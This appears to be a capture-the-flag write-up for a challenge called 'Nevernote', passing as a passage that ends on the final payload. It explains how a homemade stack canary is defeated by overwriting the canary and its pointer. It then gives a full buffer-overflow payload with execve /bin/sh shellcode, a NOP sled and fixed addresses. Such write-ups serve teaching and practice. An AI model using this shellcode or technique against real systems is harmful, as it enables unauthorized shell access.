Nevernote is a 180 point challenge. 

`
In light of the recent attacks on their machines, Daedalus Corp has 
implemented a buffer overflow detection library. Nevernote, a program made
for Daedalus Corps employees to take notes, uses this library. Can you 
bypass their protection and read the secret? The binary can be found at
 /home/nevernote/ on the shell server.
 `

This program attempts to implement a stack canary in a rather dumb way:

```c
struct canary{
    int canary;
    int *verify;
};

/* buffer overflow resistant buffer */
struct safe_buffer{
    char buf[SAFE_BUFFER_SIZE];
    struct canary can;
};
```

So we can overflow this `safe_buffer`, but then we also overwrite the canary. Then the canary check will not pass anymore:

```c
void verify_canary(struct canary *c){
    if (c->canary != *(c->verify)){
        printf("Canary was incorrect!\n");
        __canary_failure(1);
    }

    // we're all good; free the canary and return
    free(c->verify);
    return;
}
```

But since we can overflow the buffer, we control both the canary and the pointer to the canary. This means we can make this check always succeed. Again, no ASLR on the target server allows us to use a static address. Let's supply the address of safe_buffer (the address of which can be obtained from debugging the binary with `gdb`). This is automated like so (it echoes a username and the command for adding a note):

```
pico1139@shell:/home/nevernote$ (echo "bleh"; echo "a"; python -c 'print "A"*512+"AAAA"+"\x50\xc0\x04\x08"') > /tmp/in
...snip...
(gdb) r < /tmp/in
The program being debugged has been started already.
Start it from the beginning? (y or n) y

*** Error in `/home/nevernote/nevernote': double free or corruption (!prev): 0x0804c050 ***
```

Now, the binary aborts because the pointer to the canary has already been freed. Not a problem, we won't let it come that far. Let's try to overflow the saved return address:

```
pico1139@shell:/home/nevernote$ (echo "bleh"; echo "a"; python -c 'print "A"*512+"AAAA"+"\x50\xc0\x04\x08CCCCCCCCCCCCCCCCDDDDEEEEFFFF"') > /tmp/in

Right, a segfault because `edx` points to a place that doesn't exist. Let's fix that by supplying the address of safe_buffer:

```
pico1139@shell:/home/nevernote$ (echo "bleh"; echo "a"; python -c 'print "A"*512+"AAAA"+"\x50\xc0\x04\x08CCCCCCCCCCCCCCCCDDDD\x50\xc0\x04\x08FFFF"') > /tmp/in
...

```

w00t! We have control over EIP! Since ASLR is off and so is NX, we can just jump a piece of shellcode. Letâ€™s stick in the shellcode (23 bytes execve /bin/sh) and alter the canary to 4*0x90 (which is the start of the NOP sled). Let's overwrite EIP with `0x804c070` to jump in the middle of our NOP sled. We cat the payload & use another cat to keep shell alive:

```
pico1139@shell:/home/nevernote$ (echo "bleh"; echo "a"; python -c 'print "\x90"*(512-23)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90\x90\x90\x90"+"\x50\xc0\x04\x08CCCCCCCCCCCCCCCC\x70\xc0\x04\x08\x50\xc0\x04\x08FFFF"') > /tmp/in
